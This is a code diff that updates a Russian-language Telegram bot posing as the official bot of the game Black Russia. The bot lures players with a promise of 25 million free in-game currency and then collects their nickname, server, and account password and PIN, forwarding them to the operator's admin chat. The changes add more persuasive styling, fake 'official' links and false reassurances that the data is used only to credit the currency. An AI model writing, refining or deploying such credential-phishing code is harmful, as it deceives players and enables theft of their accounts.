@@ -18,43 +18,86 @@ user_data = {}
 # ========== КЛАВИАТУРЫ ==========
 def main_menu():
     keyboard = [
-        [InlineKeyboardButton("💰 Получить 25кк", callback_data="get_money")],
-        [InlineKeyboardButton("🏠 Главное меню", callback_data="main_menu")]
+        [InlineKeyboardButton("💰 ПОЛУЧИТЬ 25КК 💰", callback_data="get_money")],
+        [InlineKeyboardButton("🏠 ГЛАВНОЕ МЕНЮ 🏠", callback_data="main_menu")],
+        [InlineKeyboardButton("📞 ПОДДЕРЖКА 📞", url="https://t.me/Lopppaio")],
+        [InlineKeyboardButton("📢 НАШ КАНАЛ 📢", url="https://t.me/blackrussia_official")]
     ]
     return InlineKeyboardMarkup(keyboard)
 
 # ========== ОБРАБОТЧИКИ ==========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = (
-        "👋 *Добро пожаловать!*\n\n"
-        "🤵 *Официальный бот от Black Russia*\n"
-        "💰 Ты можешь получить *бесплатные 25кк* на *любом сервере*!\n\n"
-        "⬇️ Используй кнопки ниже:"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "✨ **ДОБРО ПОЖАЛОВАТЬ В БОТА BLACK RUSSIA!** ✨\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "🎮 **Официальный бот проекта Black Russia**\n\n"
+        "💰 **АКЦИЯ ДЛЯ НОВЫХ ИГРОКОВ!** 💰\n\n"
+        "🔥 Ты можешь получить **БЕСПЛАТНЫЕ 25.000.000** внутриигровой валюты!\n"
+        "🎁 Бонус действует на **ЛЮБОМ СЕРВЕРЕ** проекта!\n\n"
+        "📌 **Как получить:**\n"
+        "• Нажми на кнопку «💰 ПОЛУЧИТЬ 25КК»\n"
+        "• Укажи свои данные\n"
+        "• Дождись начисления (до 24 часов)\n\n"
+        "⬇️ **ВЫБЕРИ ДЕЙСТВИЕ:** ⬇️"
     )
     await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu())
 
 async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    text = "👋 *Главное меню*\n\n🤵 Официальный бот от Black Russia\n💰 Бесплатные 25кк"
+    text = (
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "✨ **ГЛАВНОЕ МЕНЮ** ✨\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "🎮 **Black Russia Bot**\n\n"
+        "💰 Бесплатные 25.000.000 валюты\n"
+        "🌍 Доступно на всех серверах\n\n"
+        "📌 **Выбери действие ниже:**"
+    )
     await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu())
 
 async def get_money_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    await query.edit_message_text("🎮 *Шаг 1 из 3:*\nВведите ваш *НИК* в Black Russia:", parse_mode="Markdown")
+    text = (
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "🎮 **ШАГ 1 ИЗ 3** 🎮\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "✏️ **Введите ваш ИГРОВОЙ НИК:**\n\n"
+        "📌 *Пример:* `BlackPlayer`\n\n"
+        "⚠️ Ник должен быть указан точно как в игре!"
+    )
+    await query.edit_message_text(text, parse_mode="Markdown")
     return NICKNAME
 
 async def get_nickname(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     user_data[user_id] = {"nickname": update.message.text}
-    await update.message.reply_text("🌍 *Шаг 2 из 3:*\nУкажите название *СЕРВЕРА*:", parse_mode="Markdown")
+    text = (
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "🌍 **ШАГ 2 ИЗ 3** 🌍\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "✏️ **Введите название СЕРВЕРА:**\n\n"
+        "📌 *Примеры:* `MOSCOW`, `SPB`, `BLUE`, `RED`\n\n"
+        "🌍 Доступны все серверы проекта!"
+    )
+    await update.message.reply_text(text, parse_mode="Markdown")
     return SERVER
 
 async def get_server(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     user_data[user_id]["server"] = update.message.text
-    await update.message.reply_text("🔐 *Шаг 3 из 3:*\nВведите *ПАРОЛЬ* (или пинкод) от аккаунта:", parse_mode="Markdown")
+    text = (
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "🔐 **ШАГ 3 ИЗ 3** 🔐\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "✏️ **Введите ПАРОЛЬ от аккаунта:**\n\n"
+        "🔑 Если у вас установлен **ПИНКОД** — укажите и его тоже!\n\n"
+        "📌 *Пример:* `mypassword123` или `mypass+1234`\n\n"
+        "🔒 *Данные нужны только для начисления валюты!*"
+    )
+    await update.message.reply_text(text, parse_mode="Markdown")
     return PASSWORD
 
 async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -67,27 +110,39 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     full_name = update.effective_user.full_name
 
     admin_msg = (
-        f"🔔 *НОВАЯ ЗАЯВКА НА 25кк!*\n\n"
+        f"🔔 *НОВАЯ ЗАЯВКА НА 25КК!* 🔔\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"👤 *Пользователь:* {full_name}\n"
         f"🆔 *ID:* `{user_id}`\n"
         f"📛 *Username:* @{username}\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🎮 *Ник:* `{nickname}`\n"
         f"🌍 *Сервер:* `{server}`\n"
-        f"🔑 *Пароль:* `{password}`\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"✅ Ожидает выдачи!"
+        f"🔑 *Пароль/Пинкод:* `{password}`\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"⏰ *Время:* {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+        f"✅ *Статус:* Ожидает выдачи!"
     )
 
     try:
         await context.bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
-        await update.message.reply_text(
-            "✅ *Заявка принята!*\n\n"
-            "💰 Валюта придет в течение *24 часов*.\n"
-            "🙏 Спасибо!",
-            parse_mode="Markdown",
-            reply_markup=main_menu()
+        
+        # Ответ пользователю
+        text = (
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "✅ **ЗАЯВКА ПРИНЯТА!** ✅\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            "💰 **25.000.000** внутриигровой валюты\n"
+            "будет начислено в течение **24 часов**!\n\n"
+            "📌 **Что дальше?**\n"
+            "• Проверьте внутриигровую почту\n"
+            "• Деньги поступят автоматически\n\n"
+            "🙏 **Спасибо, что выбрали Black Russia!**\n\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "🎮 *Приятной игры!* 🎮"
         )
+        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu())
+        
     except Exception as e:
         await update.message.reply_text("⚠️ Ошибка, владелец уведомлен.")
 
@@ -96,17 +151,39 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("❌ Отменено.")
+    text = (
+        "❌ **ОТМЕНЕНО** ❌\n\n"
+        "Вы отменили получение валюты.\n"
+        "Если передумаете — нажмите «💰 ПОЛУЧИТЬ 25КК»"
+    )
+    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu())
     return ConversationHandler.END
 
 async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("⛔ Нет доступа")
+        await update.message.reply_text("⛔ *Нет доступа!* ⛔", parse_mode="Markdown")
         return
-    await update.message.reply_text("🔧 Панель владельца. Бот работает!")
+    
+    text = (
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "🔧 **ПАНЕЛЬ АДМИНИСТРАТОРА** 🔧\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "✅ Бот работает в штатном режиме\n\n"
+        f"📊 *Всего заявок:* {len(user_data)}\n"
+        f"👑 *Ваш ID:* `{update.effective_user.id}`\n\n"
+        "📌 *Новые заявки приходят в этот чат*"
+    )
+    await update.message.reply_text(text, parse_mode="Markdown")
 
 async def get_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(f"🆔 Ваш ID: `{update.effective_user.id}`", parse_mode="Markdown")
+    text = (
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "🆔 **ВАШ TELEGRAM ID** 🆔\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"`{update.effective_user.id}`\n\n"
+        "📌 *Сохраните этот ID, он может понадобиться*"
+    )
+    await update.message.reply_text(text, parse_mode="Markdown")
 
 # ========== ЗАПУСК БОТА ==========
 async def run_bot():
@@ -146,7 +223,7 @@ app_flask = Flask(__name__)
 
 @app_flask.route('/')
 def home():
-    return "Bot is running!"
+    return "✅ Black Russia Bot is running!"
 
 @app_flask.route('/health')
 def health():
